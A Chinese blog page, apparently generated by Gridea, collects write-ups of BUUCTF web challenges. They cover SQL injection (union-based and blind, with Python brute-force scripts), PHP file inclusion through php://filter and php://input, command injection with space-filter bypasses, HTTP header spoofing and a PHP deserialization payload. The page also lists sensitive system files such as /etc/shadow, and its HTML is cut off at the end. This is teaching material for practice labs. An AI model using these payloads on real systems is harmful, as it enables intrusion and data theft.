@@ -1,0 +1,643 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>BUUCTF | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="BUUCTF | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="[SUCTF 2019]EasySQL1
+输入1，有回显
+输入2，有回显，输入非零数字都有回显，输入字母无回显
+这道题目需要我们去对后端语句进行猜测
+1、输入非零数字得到的回显1和输入其余字符得不到回显=&gt;来判断出内部的查询语句可能存..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              BUUCTF
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-06-06
+              </span>
+              <span>
+                17 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="suctf-2019easysql1">[SUCTF 2019]EasySQL1</h1>
+<p>输入1，有回显<br>
+输入2，有回显，输入非零数字都有回显，输入字母无回显<br>
+这道题目需要我们去对后端语句进行猜测</p>
+<p>1、输入非零数字得到的回显1和输入其余字符得不到回显=&gt;来判断出内部的查询语句可能存在有||</p>
+<p>2、也就是select 输入的数据||内置的一个列名 from 表名=&gt;即为</p>
+<pre><code>select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)
+</code></pre>
+<p>此时的||起到的作用是or的作用</p>
+<p>解法1<br>
+内置的sql语句为</p>
+<pre><code>sql=“select”.post[‘query’].&quot;||flag from Flag&quot;;
+</code></pre>
+<p>如果<code>$post[‘query’]</code>的数据为*,1，sql语句就变成了</p>
+<pre><code>select *,1||flag from Flag
+</code></pre>
+<p>也就是</p>
+<pre><code>select *,1 from Flag
+</code></pre>
+<p>也就是直接查询出了Flag表中的所有内容<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622963455648.png" alt="" loading="lazy"><br>
+解法2<br>
+输入的内容为</p>
+<pre><code>1;set sql_mode=pipes_as_concat;select 1
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622963484692.png" alt="" loading="lazy"><br>
+我们执行的语句分别为</p>
+<pre><code>select 1
+set sql_mode=pipes_as_concat
+select 1||flag from Flag
+</code></pre>
+<p>读出flag<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622963518649.png" alt="" loading="lazy"></p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「一只小白来了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_44866139/article/details/105857487</p>
+<h1 id="actf2020-新生赛include1">[ACTF2020 新生赛]Include1</h1>
+<p>include(文件包含漏洞，php伪协议)</p>
+<p>查看元素，也并没有有用的信息，联想到题目,include<br>
+想起了文件包含漏洞。<br>
+构造payload<br>
+?file=/../../../../../../flag.php</p>
+<p>没有返回东西。看完wq学到了一个新姿势：<br>
+php伪代码</p>
+<pre><code>https://segmentfault.com/a/1190000018991087
+https://www.freebuf.com/column/148886.html
+</code></pre>
+<p>构造payload<br>
+?file=php://filter/read=convert.base64-encode/resource=flag.php<br>
+使用 &quot;php://filter&quot;伪协议&quot; 来进行包含。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p>
+<p>构造Payload:</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p>这里需要注意的是使用php://filter伪协议进行文件包含时，需要加上read=convert.base64-encode来对文件内容进行编码</p>
+<p>发送请求得到base64编码后的flag.php文件源码:<br>
+得到base64加密后的flag.php文件，丢去解密得到flag。</p>
+<p>文件包含漏洞</p>
+<p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。<br>
+`PHP中文件包含函数有以下四种：</p>
+<pre><code>require()
+
+require_once()
+
+include()
+
+include_once()
+
+`
+</code></pre>
+<p>示例代码</p>
+<p>如果服务器配置不当，可以目录跨越等等，传个../../../../../etc/passwd等等，可以查阅很多意外的文件。<br>
+`windows常见文件：</p>
+<pre><code>c:\boot.ini // 查看系统版本
+
+c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
+
+c:\windows\repair\sam // 存储Windows系统初次安装的密码
+
+c:\ProgramFiles\mysql\my.ini // MySQL配置
+
+c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
+
+c:\windows\php.ini // php 配置信息
+</code></pre>
+<p>linux常见文件：</p>
+<pre><code>/etc/passwd // 账户信息
+
+/etc/shadow // 账户密码文件
+
+/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
+
+/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
+
+/usr/local/app/php5/lib/php.ini // PHP相关配置
+
+/etc/httpd/conf/httpd.conf // Apache配置文件
+
+/etc/my.conf // mysql 配置文件
+</code></pre>
+<p>文件包含分本地文件包含和远程文件包含，本地文件包含就是利用服务器的配置不当访问服务器本地的文件，而远程文件包含是在</p>
+<p>allow_url_fopen = On（是否允许打开远程文件）</p>
+<p>allow_url_include = On（是否允许include/require远程文件）</p>
+<p>`<br>
+以上两个字段为On时，此时允许服务器包含远程的服务器的文件，这时可以在远程服务器配置一个马.txt之类的，里面写上php代码，让靶机去包含它。</p>
+<p>【file://协议】</p>
+<p>PHP.ini：</p>
+<p>file:// 协议在双off的情况下也可以正常使用；</p>
+<p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
+<p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
+<p>使用方法：</p>
+<pre><code>file:// [文件的绝对路径和文件名]
+
+http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt
+</code></pre>
+<p>【php://协议】</p>
+<p>条件：</p>
+<p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p>
+<p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
+<p>参考自：http://php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq</p>
+<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
+<pre><code>PHP.ini：
+
+php://filter在双off的情况下也可以正常使用；
+
+allow_url_fopen ：off/on
+
+allow_url_include：off/on
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1622964969941.png" alt="" loading="lazy"></figure>
+<p>测试现象：<br>
+http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622964973937.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622964977636.png" alt="" loading="lazy"></p>
+<p>测试现象：</p>
+<pre><code>http://127.0.0.1/cmd.php?file=php://input
+
+[POST DATA] &lt;?php phpinfo()?&gt;
+</code></pre>
+<p>参考自：<br>
+https://www.cnblogs.com/cmredkulaa/p/14008645.html</p>
+<h1 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h1>
+<p>BUFFctf蒋璐媛的秘密<br>
+打开在线场景，发现三个大字蒋璐媛<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966646571.png" alt="" loading="lazy"><br>
+那么就继续看了，首先就应该看看他的源码了：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966650090.png" alt="" loading="lazy"><br>
+打开他的这个下面的php文件瞅瞅：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966653167.png" alt="" loading="lazy"><br>
+是个按钮我们就要一一分析了：</p>
+<p>按了一下按钮发现：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966655922.png" alt="" loading="lazy"><br>
+那就要来看看源码了：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966658952.png" alt="" loading="lazy"><br>
+从这里看它是有个action.php,说明它跳的太快用burpsuite抓一下<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966662432.png" alt="" loading="lazy"><br>
+看来问题就出在这个ser3t文件上。</p>
+<p>那我们就输入一下：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966670380.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966674246.png" alt="" loading="lazy"><br>
+因为刚刚刚好有一个题就是用的base64的隐写所以就用这个方法了哈哈哈</p>
+<pre><code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622966678771.png" alt="" loading="lazy"><br>
+然后用base64解码即<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622966696532.png" alt="" loading="lazy"></p>
+<p>参考自：https://blog.csdn.net/vsdvscs/article/details/116563866</p>
+<h1 id="极客大挑战-2019lovesql1">[极客大挑战 2019]LoveSQL1</h1>
+<p>此题考察的就是简单的sql注入只不过要注意的是用group_concat()（这个是将组中的字符串连接成为具有各种选项的单个字符串函数）和concat_ws(&quot;?&quot;,?,?)（是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。）不然就显示不出来</p>
+<p>首先一看是sql注入就判断是什么注入类型<br>
+输入</p>
+<pre><code>username：' or 1=1#
+password：123
+</code></pre>
+<p>显示的是<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622969725148.png" alt="" loading="lazy"><br>
+然后试着用这个账号和密码进行登录发现没有什么用一直都是同一个页面然后就进行sql注入的各种语句查表，列和最后所需要的值（密码随意不能不写写个123也行）</p>
+<p>username：<br>
+' or 1=1 order by 1,2,3,4#      多次试验后发现3回显正确<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622969728849.png" alt="" loading="lazy"><br>
+' and 1=2 union select 1,2,3#       测试回显的是哪几个<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622969732155.png" alt="" loading="lazy"><br>
+' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622969734968.png" alt="" loading="lazy"><br>
+' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='l0ve1ysq1'#<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622969738399.png" alt="" loading="lazy"><br>
+' and 1=2 union select 1,group_concat(concat_ws(&quot;:::&quot;,id,username,password)),3 from l0ve1ysq1#<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622969742646.png" alt="" loading="lazy"></p>
+<h1 id="actf2020-新生赛exec1">[ACTF2020 新生赛]Exec1</h1>
+<p>首先先ping一下127.0.0.1<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622969934067.png" alt="" loading="lazy"><br>
+然后看看有什么文件直接127.0.0.1 | ls ../../../../../<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622969929957.png" alt="" loading="lazy"><br>
+然后直接打开即可127.0.0.1 | cat ../../../../../flag<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622970016783.png" alt="" loading="lazy"></p>
+<p>像这种什么都没过滤的题目，可以利用常见管道符直接执行命令:<br>
+常见管道符</p>
+<p>1、|（就是按位或），直接执行|后面的语句<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622970190689.png" alt="" loading="lazy"><br>
+2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622970194252.png" alt="" loading="lazy"><br>
+3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622970198223.png" alt="" loading="lazy"><br>
+4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>
+这里没试出来flag，用cmd试一下：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622970203946.png" alt="" loading="lazy"><br>
+5、;（linux下有的，和&amp;一样的作用）<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622970207060.png" alt="" loading="lazy"><br>
+命令执行漏洞可以看这位师傅的博客：<br>
+http://www.ghtwf01.cn/index.php/archives/273/</p>
+<p>参考自：https://blog.csdn.net/weixin_44348894/article/details/105347418?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</p>
+<h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h1>
+<p>打开是这样子的。给了/?ip= 后边应该是我们所想要执行的语句。先随便ping一下<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622971962814.png" alt="" loading="lazy"><br>
+有回显，我们在在后边继续执行语句。先查看一下ls;<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622971965668.png" alt="" loading="lazy"><br>
+这里发现终端有一个flag.php和一个Index.php<br>
+cat flag.php一下试一试<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622971968514.png" alt="" loading="lazy"><br>
+发现空格被过滤了,去百度查询了一下绕过空格的几个办法<br>
+**空格过滤 **</p>
+<pre><code>${IFS}替换
+$IFS$1替换
+${IFS替换
+%20替换
+&lt;和&lt;&gt;重定向符替换
+%09替换
+</code></pre>
+<p>我们一个个来试一下<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622971972295.png" alt="" loading="lazy"><br>
+用第一个<code>${IFS}</code>时候发现符号被过滤了</p>
+<p>使用第二个<code>$IFS$1</code>发现可以 说明{}被过滤了,但出现了<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622971975513.png" alt="" loading="lazy"><br>
+这样说明flag被过滤了 去看一下Index.php<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622971979305.png" alt="" loading="lazy"><br>
+发现源码出来了。可以看到flag.&lt;&gt;.{}都被过滤了。bash也被过滤。这时候我们可以想着试一下变量拼接.<br>
+?ip=1;a=g;cat$IFS<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mi>f</mi><mi>l</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">1fla</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span></span></span></span>a.php;<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622971982645.png" alt="" loading="lazy"><br>
+打开源码即可看到flag</p>
+<h1 id="极客大挑战-2019knife">[极客大挑战 2019]Knife</h1>
+<p>提示很明显说明此题使用蚁剑进行连接所需传入的东西已经万全准备就绪<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622978455383.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622978459228.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622978462363.png" alt="" loading="lazy"></p>
+<h1 id="极客大挑战-2019http1">[极客大挑战 2019]Http1</h1>
+<p>打开网页发现啥也没有然后就查看源码发现有一个Secret.php<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622979681162.png" alt="" loading="lazy"><br>
+然后用burpsuite抓包然后一直发送发送给repeater因为可以多次提交<br>
+然后打开发现<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622979967597.png" alt="" loading="lazy"><br>
+添加这个：Referer:https://www.Sycsecret.com<br>
+然后发送<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622979970427.png" alt="" loading="lazy"><br>
+然后修改User-Agent:Syclover<br>
+然后发送<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622979973326.png" alt="" loading="lazy"><br>
+然后添加X-Forwarded-For:127.0.0.1<br>
+然后<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622979977436.png" alt="" loading="lazy"><br>
+总体修改<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622979980999.png" alt="" loading="lazy"></p>
+<h1 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h1>
+<p>1:data伪协议写入文件<br>
+2：php://</p>
+<p>php://filter用于读取源码<br>
+php://input用于执行php代码</p>
+<p>3反序列化</p>
+<p>打开题目，给了我们源码</p>
+<pre><code>&lt;?php  
+$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)){
+echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+if(preg_match(&quot;/flag/&quot;,$file)){
+echo &quot;Not now!&quot;;
+exit(); 
+}else{
+include($file);  //useless.php
+$password = unserialize($password);
+echo $password;
+}
+}
+else{
+highlight_file(__FILE__);
+}?&gt;
+</code></pre>
+<p>第一个绕过：</p>
+<pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;))
+</code></pre>
+<p>这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话往后面看没有其他可以利用的点，我们就无法写入文件再读取，就剩下了一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p>
+<pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
+</code></pre>
+<p>当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data://text/plain,welcome to the zjctf</p>
+<p>第二个绕过</p>
+<pre><code>$file = $_GET[&quot;file&quot;];
+if(preg_match(&quot;/flag/&quot;,$file)){
+echo &quot;Not now!&quot;;
+exit(); 
+}else{
+include($file);  //useless.php
+$password = unserialize($password);
+echo $password;
+}
+</code></pre>
+<p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：</p>
+<pre><code>file=useless.php
+</code></pre>
+<p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p>
+<pre><code>php://filter/read=convert.base64-encode/resource=useless.php
+</code></pre>
+<p>读到的useless.php内容如下：</p>
+<pre><code>&lt;?php  
+class Flag{  //flag.php  
+public $file;  
+public function __tostring(){  
+if(isset($this-&gt;file)){  
+echo file_get_contents($this-&gt;file); 
+echo &quot;&lt;br&gt;&quot;;
+return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+}  
+}  
+}  
+?&gt;
+</code></pre>
+<p>第三个绕过</p>
+<pre><code>$password = $_GET[&quot;password&quot;];
+include($file);  //useless.php
+$password = unserialize($password);
+echo $password;
+</code></pre>
+<p>这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：</p>
+<pre><code>&lt;?php  
+class Flag{  //flag.php  
+public $file=&quot;flag.php&quot;;  
+public function __tostring(){  
+if(isset($this-&gt;file)){  
+echo file_get_contents($this-&gt;file); 
+echo &quot;&lt;br&gt;&quot;;
+return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+}  
+}  
+}  
+$a = new Flag();
+echo serialize($a);
+?&gt;
+//O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre>
+<p>最后payload</p>
+<pre><code>http://6619a3b1-daa6-4ab9-bb3d-ba8b90593516.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D
+</code></pre>
+<p>参考链接https://www.redmango.top/articles/article/40/</p>
+<p>simple sql 简单的sql过滤绕过<br>
+寻找注入点<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1624089368829.png" alt="" loading="lazy"><br>
+只有一个输入框，抓包看是post提交。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1624089372575.png" alt="" loading="lazy"><br>
+依次输入</p>
+<pre><code>' =&gt; bool(false)
+and 1=1 =&gt; SQL Injection Checked.
+2 =&gt; 显示正常
+3 =&gt; Error Occured When Fetch Result.
+看起来有过滤，先fuzz下过滤了哪些关键词，利用intrude模块：
+（下载了一份fuzz dict: dictionary-master）
+使用 sql_fuzz.txt 字典 
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1624089377469.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1624089381519.png" alt="" loading="lazy"><br>
+但是 ascii/regexp/substr等函数都没过滤。xor被过滤，但是 ^/|/= 没有过滤，所以可以构造一个true表达式：<br>
+0^(2&gt;1) =&gt; Hello this is Aurora<br>
+0^(2&gt;1) =&gt; Error Occured When Fetch Result.<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1624089385693.png" alt="" loading="lazy"><br>
+因此，注入点就是：<br>
+0^(TRUE表达式) =&gt; 返回 Hello this is Auro<br>
+0^(False表达式) =&gt; 返回 Error Occured When Fetch Result.<br>
+构造注入语句</p>
+<p>这里以ascii为例，参考：https://www.anquanke.com/post/id/160584#h2-11</p>
+<p>ascii(mid((password)from(i)))&gt;j</p>
+<p>这个语句中，涉及到mysql的 mid 和 ascii 函数</p>
+<pre><code>mid函数的使用方法：
+正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串
+MID(str,pos,len)
+这里的用法是，from(1)表示从第一个位置开始截取剩下的字符串，from(0)是没有值的。for(1)表示从改位置起一次就截取一个字符，本题for被过滤了。
+</code></pre>
+<p>对应的构造select语句：</p>
+<pre><code>select flag from flag //要返回str，要求flag表只有一行
+mid((select flag from flag )from(1))  // 获取第一个
+ascii(mid((select flag from flag )from(1)))=102 // ascii('flag') 默认只返回f的ascii值，f对应102
+ascii(mid((select%0aflag%0afrom%0aflag)from(1)))=102 // 绕过空格过滤  
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1624089391290.png" alt="" loading="lazy"><br>
+正常显示 id=1 的内容，说明答案的第一个字符是f。<br>
+编写 exp 程序</p>
+<p>知道了注入点，剩下的就是自动化。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1624089395786.png" alt="" loading="lazy"><br>
+先在python里面验证下，发现同样的payload，在burp可以，代码却不行。唯一的原因就在 %0a 这个编码的地方了。<br>
+参考这篇文章：https://blog.csdn.net/M1mory/article/details/58309378<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1624089400139.png" alt="" loading="lazy"><br>
+加上代理，自己在burp可以看到requests发包的情况，还要加上 content-type 头部，否则无返回信息<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1624089404183.png" alt="" loading="lazy"><br>
+基于此，写出exp代码：</p>
+<pre><code>import requests
+
+dict = &quot;fabcdeghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890{}&quot;
+
+url = &quot;http://polarlicht.xyz:8302/index.php&quot;
+headers = {&quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;}
+proxy = {&quot;http&quot; : 'http://127.0.0.1:8080'}
+
+ret = []
+for i in range(1,20):
+for c in dict:
+payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))={1})&quot;.format(str(i), str(ord(c)))
+r = requests.post(url, data=payload, headers=headers, proxies = proxy)
+if len(r.text) == 299:
+ret.append(c)
+print(&quot;[%d]%s=&gt;%s\t%s&quot; % (i, c, len(r.text), payload))
+
+print(''.join(ret))
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1624089407690.png" alt="" loading="lazy"><br>
+这段代码速度太慢，用二分法进行代码优化：</p>
+<pre><code>import requests
+
+url = &quot;http://polarlicht.xyz:8302/index.php&quot;
+headers = {&quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;}
+proxy = {&quot;http&quot; : 'http://127.0.0.1:8080'}
+
+def check(i, index):
+payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))={1})&quot;.format(i, index)
+r = requests.post(url, data=payload, proxies=proxy, headers = headers)
+if r.text.find('Hello') &gt;= 0:
+return 0
+
+payload = &quot;id=0^(ascii(mid((select%0aflag%0afrom%0aflag)from({0})))&gt;{1})&quot;.format(i, index)
+r = requests.post(url, data=payload, proxies=proxy, headers=headers)
+if r.text.find('Hello') &gt;= 0:
+return 1
+
+return -1
+</code></pre>
+<h1 id="二分实现">二分实现</h1>
+<pre><code>mids = []
+for i in range(1, 20):
+# ascii 可显示字符是33到126
+start = 33
+end = 126
+mid = (start + end) // 2
+
+
+while start &lt;= mid:
+if check(i, mid) == 0:
+mids.append(mid)
+break
+
+if check(i, mid) &gt; 0:
+start = mid
+mid = (start + end) // 2
+else:
+end = mid
+mid = (start + end) // 2
+tmp = &quot;start=&gt;{0},mid={1},end={2}&quot;.format(start,mid,end)
+print(''.join(chr(x) for x in mids))
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1624089437125.png" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#suctf-2019easysql1">[SUCTF 2019]EasySQL1</a></li>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Binclude1">[ACTF2020 新生赛]Include1</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file">[极客大挑战 2019]Secret File</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019lovesql1">[极客大挑战 2019]LoveSQL1</a></li>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec1">[ACTF2020 新生赛]Exec1</a></li>
+<li><a href="#gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019knife">[极客大挑战 2019]Knife</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http1">[极客大挑战 2019]Http1</a></li>
+<li><a href="#zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</a></li>
+<li><a href="#%E4%BA%8C%E5%88%86%E5%AE%9E%E7%8E%B0">二分实现</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">
+              <h3 class="post-title">
+                利用预编译来SQL注入
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
